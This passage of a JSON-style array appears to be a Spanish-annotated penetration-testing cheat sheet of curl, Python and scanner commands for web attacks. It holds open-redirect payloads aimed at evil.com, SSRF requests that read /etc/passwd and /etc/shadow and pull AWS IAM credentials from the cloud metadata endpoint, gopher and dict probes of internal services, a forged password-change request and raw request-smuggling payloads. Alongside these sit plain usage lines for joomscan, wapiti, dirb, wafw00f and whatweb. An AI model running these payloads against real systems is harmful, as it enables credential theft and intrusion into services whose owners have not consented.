    "cmd": "curl -s -o /dev/null -w '%{redirect_url}' 'http://IP/?next=http://evil.com'",
    "desc": "Ver redirect"
   },
   {
    "cmd": "curl -s -I 'http://IP/?url=//evil.com'",
    "desc": "Protocol-relative"
   },
   {
    "cmd": "curl -s -I 'http://IP/?r=https://evil.com'",
    "desc": "Completo"
   },
   {
    "cmd": "curl -s -I 'http://IP/?u=http://evil.com%2f%2f@IP'",
    "desc": "Encode"
   },
   {
    "cmd": "curl -s -I 'http://IP/redirect?to=//evil.com'",
    "desc": "Path redirect"
   },
   {
    "cmd": "curl -s -o /dev/null -w '%{http_code} %{redirect_url}\\n' 'http://IP/?next=/%5cevil.com'",
    "desc": "Backslash"
   },
   {
    "cmd": "ffuf -u 'http://IP/FUZZ' -w /usr/share/seclists/Fuzzing/redirect-urls.txt -mc 302",
    "desc": "Fuzz redirects"
   },
   {
    "cmd": "python3 -c 'import requests; r=requests.get(\"http://IP/?next=//evil.com\", allow_redirects=False); print(r.headers.get(\"Location\"))'",
    "desc": "Python check"
   },
   {
    "cmd": "grep -rn 'redirect' /usr/share/seclists/Fuzzing/ | head",
    "desc": "Wordlist"
   },
   {
    "cmd": "curl -s -I 'http://IP/?return=javascript:alert(1)'",
    "desc": "JS redirect"
   }
  ]
 },
 {
  "tool": "subdomain-takeover",
  "desc": "Subdomain takeover checks",
  "commands": [
   {
    "cmd": "curl -s -H 'Host: sub.objetivo.com' http://IP/ | head",
    "desc": "Test host"
   },
   {
    "cmd": "dig sub.objetivo.com CNAME",
    "desc": "Ver CNAME"
   },
   {
    "cmd": "dig +short sub.objetivo.com",
    "desc": "A record"
   },
   {
    "cmd": "host sub.objetivo.com",
    "desc": "Host"
   },
   {
    "cmd": "nslookup sub.objetivo.com",
    "desc": "Nslookup"
   },
   {
    "cmd": "subjack -w subs.txt -t 20 -o out.txt",
    "desc": "Subjack"
   },
   {
    "cmd": "subjack -w subs.txt -a -ssl",
    "desc": "Con SSL"
   },
   {
    "cmd": "subjack -w subs.txt -timeout 10",
    "desc": "Timeout"
   },
   {
    "cmd": "python3 takeover.py -d objetivo.com",
    "desc": "Takeover py"
   },
   {
    "cmd": "can-i-take-over-xyz",
    "desc": "Lista check"
   },
   {
    "cmd": "curl -s http://sub.objetivo.com/ | grep -i 'github\\|heroku\\|s3\\|azure'",
    "desc": "Grep providers"
   },
   {
    "cmd": "dig +short sub.objetivo.com | grep -E '192\\.168|10\\.|127\\.'",
    "desc": "IP interna"
   },
   {
    "cmd": "curl -sk https://sub.objetivo.com/ -o /dev/null -w '%{http_code}'",
    "desc": "HTTP code"
   },
   {
    "cmd": "amass enum -d objetivo.com -passive | grep sub",
    "desc": "Amass subs"
   }
  ]
 },
 {
  "tool": "ssrf-extra",
  "desc": "SSRF (Server-Side Request Forgery)",
  "commands": [
   {
    "cmd": "curl -s -X POST http://IP/check -d 'url=http://169.254.169.254/latest/meta-data/'",
    "desc": "Metadata"
   },
   {
    "cmd": "curl -s 'http://IP/fetch?url=file:///etc/passwd'",
    "desc": "File read"
   },
   {
    "cmd": "curl -s 'http://IP/fetch?url=http://127.0.0.1:8080/admin'",
    "desc": "Local scan"
   },
   {
    "cmd": "curl -s 'http://IP/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
    "desc": "AWS creds"
   },
   {
    "cmd": "curl -s 'http://IP/fetch?url=gopher://127.0.0.1:6379/_INFO'",
    "desc": "Gopher"
   },
   {
    "cmd": "curl -s 'http://IP/fetch?url=dict://127.0.0.1:11211/info'",
    "desc": "Dict"
   },
   {
    "cmd": "curl -s -o /dev/null -w '%{http_code}' 'http://IP/fetch?url=http://192.168.1.1:80'",
    "desc": "Code check"
   },
   {
    "cmd": "ffuf -u 'http://IP/fetch?url=http://FUZZ' -w ips.txt -mc 200",
    "desc": "Fuzz ips"
   },
   {
    "cmd": "python3 -c 'import requests; print(requests.get(\"http://IP/fetch\", params={\"url\":\"file:///etc/passwd\"}).text)'",
    "desc": "Py ssrf"
   },
   {
    "cmd": "curl -s 'http://IP/fetch?url=http://localhost:3306' -o /dev/null -w '%{http_code}'",
    "desc": "Puerto"
   },
   {
    "cmd": "curl -s 'http://IP/fetch?url=file:///etc/shadow'",
    "desc": "Shadow"
   },
   {
    "cmd": "curl -s 'http://IP/fetch?url=http://169.254.169.254/'",
    "desc": "Meta root"
   },
   {
    "cmd": "curl -s 'http://IP/fetch?url=http://127.0.0.1:22' -o /dev/null -w '%{http_code}'",
    "desc": "SSH port"
   },
   {
    "cmd": "curl -s 'http://IP/export?page=http://127.0.0.1/admin'",
    "desc": "Export ssrf"
   }
  ]
 },
 {
  "tool": "csrf-tools",
  "desc": "CSRF (Cross-Site Request Forgery)",
  "commands": [
   {
    "cmd": "curl -s http://IP/form -o form.html && grep -o 'name=\"[^\"]*\"' form.html",
    "desc": "Ver campos"
   },
   {
    "cmd": "curl -s -X POST http://IP/change-pass -d 'user=admin&pass=attacker' -H 'Cookie: SID=x'",
    "desc": "POST CSRF"
   },
   {
    "cmd": "curl -s -X POST http://IP/delete?id=1 -H 'X-Requested-With: XMLHttpRequest'",
    "desc": "DELETE"
   },
   {
    "cmd": "python3 -c 'import requests; r=requests.post(\"http://IP/change\", data={\"pass\":\"x\"}, cookies={\"SID\":\"abc\"}); print(r.status_code)'",
    "desc": "Py csrf"
   },
   {
    "cmd": "nmap --script=http-csrf -p80 IP",
    "desc": "Nmap csrf"
   },
   {
    "cmd": "curl -s http://IP/ -c cookies.txt -b cookies.txt",
    "desc": "Cookies"
   },
   {
    "cmd": "grep -r 'action=' /tmp/clone/ | head",
    "desc": "Form actions"
   },
   {
    "cmd": "python3 -c 'import requests; s=requests.Session(); s.get(\"http://IP/login\"); print(s.cookies)'",
    "desc": "Session"
   },
   {
    "cmd": "curl -s -X POST http://IP/ -d 'csrf=TOKEN&user=admin'",
    "desc": "Con token"
   },
   {
    "cmd": "curl -s -I http://IP/ | grep -i 'set-cookie'",
    "desc": "Cookies"
   },
   {
    "cmd": "xsrfprobe -u http://IP/form",
    "desc": "XSRFProbe"
   },
   {
    "cmd": "xsrfprobe -u http://IP/ -p users.txt -P pass.txt",
    "desc": "Con creds"
   },
   {
    "cmd": "xsrfprobe -u http://IP/ -v -e http://IP",
    "desc": "Verbose"
   },
   {
    "cmd": "xsrfprobe -u http://IP/ --no-verbose --crawl -c 20",
    "desc": "Crawl"
   }
  ]
 },
 {
  "tool": "http-smuggling",
  "desc": "HTTP Request Smuggling",
  "commands": [
   {
    "cmd": "curl -s -v -X POST http://IP/ -H 'Content-Length: 4' -H 'Transfer-Encoding: chunked' --data '0'",
    "desc": "CL+TE test"
   },
   {
    "cmd": "python3 -c 'import socket; s=socket.socket(); s.connect((\"IP\",80)); s.sendall(b\"POST / HTTP/1.1\\r\\nHost: IP\\r\\nContent-Length: 0\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\n\"); print(s.recv(1024))'",
    "desc": "Raw smuggle"
   },
   {
    "cmd": "curl -s http://IP/ -H 'Content-Length: 10' -o /dev/null -w '%{http_code}'",
    "desc": "CL test"
   },
   {
    "cmd": "python3 -c 'import requests; r=requests.post(\"http://IP/\", headers={\"Transfer-Encoding\":\"chunked\"}, data=\"0\\r\\n\\r\\n\"); print(r.text[:100])'",
    "desc": "TE test"
   },
   {
    "cmd": "smuggler -u http://IP/",
    "desc": "Smuggler"
   },
   {
    "cmd": "smuggler -u http://IP/ -m cl.cl",
    "desc": "CL.CL"
   },
   {
    "cmd": "smuggler -u http://IP/ -m cl.te",
    "desc": "CL.TE"
   },
   {
    "cmd": "smuggler -u http://IP/ -m te.cl",
    "desc": "TE.CL"
   },
   {
    "cmd": "smuggler -u http://IP/ -m te.te",
    "desc": "TE.TE"
   },
   {
    "cmd": "python3 -c 'import requests; r=requests.post(\"http://IP/\", headers={\"Content-Length\":\"4\"}, data=\"0\"); print(r.status_code)'",
    "desc": "Quick"
   },
   {
    "cmd": "nmap --script=http-methods -p80 IP",
    "desc": "Métodos"
   },
   {
    "cmd": "curl -s -X OPTIONS http://IP/ -v 2>&1 | grep Allow",
    "desc": "Ver métodos"
   }
  ]
 },
 {
  "tool": "joomscan",
  "desc": "Escáner de Joomla",
  "commands": [
   {
    "cmd": "joomscan -u http://IP/",
    "desc": "Escanear"
   },
   {
    "cmd": "joomscan -u http://IP/ -ec",
    "desc": "Exhaustivo"
   },
   {
    "cmd": "joomscan -u http://IP/ -e",
    "desc": "Enumerar"
   },
   {
    "cmd": "joomscan -u http://IP/ --cookie 'x=y'",
    "desc": "Cookie"
   },
   {
    "cmd": "joomscan -u http://IP/ --user-agent 'UA'",
    "desc": "UA"
   },
   {
    "cmd": "joomscan -u http://IP/ -r",
    "desc": "Con redirect"
   },
   {
    "cmd": "joomscan -u http://IP/ --proxy 127.0.0.1:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "joomscan -u http://IP/ -o out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "joomscan -u http://IP/ -v",
    "desc": "Verbose"
   },
   {
    "cmd": "joomscan -u http://IP/ -t 20",
    "desc": "Timeout"
   },
   {
    "cmd": "joomscan --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "wapiti",
  "desc": "Escáner de vulnerabilidades web",
  "commands": [
   {
    "cmd": "wapiti -u http://IP/",
    "desc": "Escanear"
   },
   {
    "cmd": "wapiti -u http://IP/ -m xss,sql",
    "desc": "Módulos"
   },
   {
    "cmd": "wapiti -u http://IP/ --scope domain",
    "desc": "Scope"
   },
   {
    "cmd": "wapiti -u http://IP/ -c cookies.txt",
    "desc": "Cookies"
   },
   {
    "cmd": "wapiti -u http://IP/ -f html -o /tmp/out.html",
    "desc": "Reporte"
   },
   {
    "cmd": "wapiti -u http://IP/ -f json -o /tmp/out.json",
    "desc": "JSON"
   },
   {
    "cmd": "wapiti -u http://IP/ --skip-crawl",
    "desc": "Sin crawl"
   },
   {
    "cmd": "wapiti -u http://IP/ -p http://127.0.0.1:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "wapiti -u http://IP/ -a 'user:pass'",
    "desc": "Auth"
   },
   {
    "cmd": "wapiti -u http://IP/ -S http://IP/swagger.json",
    "desc": "API"
   },
   {
    "cmd": "wapiti -u http://IP/ -r",
    "desc": "Redirecciones"
   },
   {
    "cmd": "wapiti -u http://IP/ -n 5",
    "desc": "Concurrencia"
   },
   {
    "cmd": "wapiti -u http://IP/ -v 2",
    "desc": "Verbose"
   },
   {
    "cmd": "wapiti --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "dirb",
  "desc": "Escáner de directorios (dirb)",
  "commands": [
   {
    "cmd": "dirb http://IP/",
    "desc": "Escanear"
   },
   {
    "cmd": "dirb http://IP/ /usr/share/wordlists/dirb/big.txt",
    "desc": "Wordlist"
   },
   {
    "cmd": "dirb http://IP/ -r",
    "desc": "No recursivo"
   },
   {
    "cmd": "dirb http://IP/ -X .php,.txt",
    "desc": "Extensiones"
   },
   {
    "cmd": "dirb http://IP/ -z 100",
    "desc": "Delay"
   },
   {
    "cmd": "dirb http://IP/ -a 'UA'",
    "desc": "UA"
   },
   {
    "cmd": "dirb http://IP/ -c 'Cookie: x'",
    "desc": "Cookie"
   },
   {
    "cmd": "dirb http://IP/ -p http://127.0.0.1:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "dirb http://IP/ -S",
    "desc": "Silent"
   },
   {
    "cmd": "dirb http://IP/ -o out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "dirb http://IP/ -w",
    "desc": "Warnings"
   },
   {
    "cmd": "dirb http://IP/ -f",
    "desc": "Fine tuning"
   },
   {
    "cmd": "dirb http://IP/ -u user:pass",
    "desc": "Auth"
   },
   {
    "cmd": "dirb http://IP/ -H 'Header: x'",
    "desc": "Header"
   },
   {
    "cmd": "dirb http://IP/ -b",
    "desc": "Sin banner"
   }
  ]
 },
 {
  "tool": "wafw00f",
  "desc": "Detección de WAF",
  "commands": [
   {
    "cmd": "wafw00f http://IP/",
    "desc": "Detectar"
   },
   {
    "cmd": "wafw00f http://IP/ -a",
    "desc": "Todos"
   },
   {
    "cmd": "wafw00f http://IP/ -c 20",
    "desc": "Concurrencia"
   },
   {
    "cmd": "wafw00f http://IP/ -t",
    "desc": "Timeout"
   },
   {
    "cmd": "wafw00f http://IP/ -o out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "wafw00f http://IP/ -p http://127.0.0.1:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "wafw00f http://IP/ -k",
    "desc": "Sin ssl verify"
   },
   {
    "cmd": "wafw00f http://IP/ -r",
    "desc": "Random test"
   },
   {
    "cmd": "wafw00f http://IP/ -v",
    "desc": "Verbose"
   },
   {
    "cmd": "wafw00f -i ips.txt",
    "desc": "De archivo"
   },
   {
    "cmd": "wafw00f --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "whatweb",
  "desc": "Fingerprinting web",
  "commands": [
   {
    "cmd": "whatweb http://IP/",
    "desc": "Escanear"
   },
   {
    "cmd": "whatweb -v http://IP/",
    "desc": "Verbose"
   },
   {
    "cmd": "whatweb -a 3 http://IP/",
    "desc": "Agresivo"
   },
   {
    "cmd": "whatweb -a 1 http://IP/",
    "desc": "Stealth"
   },
   {
    "cmd": "whatweb http://IP/ -i lista.txt",
    "desc": "Lista"
   },
   {
    "cmd": "whatweb -U 'UA' http://IP/",
    "desc": "UA"
   },
   {
    "cmd": "whatweb -H 'Cookie: x' http://IP/",
    "desc": "Headers"
   },
   {
    "cmd": "whatweb -q http://IP/",
    "desc": "Quiet"
   },
   {
    "cmd": "whatweb --log-json out.json http://IP/",
    "desc": "JSON"
   },
   {
    "cmd": "whatweb --log-brief out.txt http://IP/",
    "desc": "Brief"
   },
   {
    "cmd": "whatweb --proxy 127.0.0.1:8080 http://IP/",
    "desc": "Proxy"
   },
   {
    "cmd": "whatweb -c 10 http://IP/",
    "desc": "Concurrencia"
   },
   {
    "cmd": "whatweb -t 20 http://IP/",
    "desc": "Timeout"
   },
   {
    "cmd": "whatweb -h",
    "desc": "Ayuda"
   }
  ]
 }
];
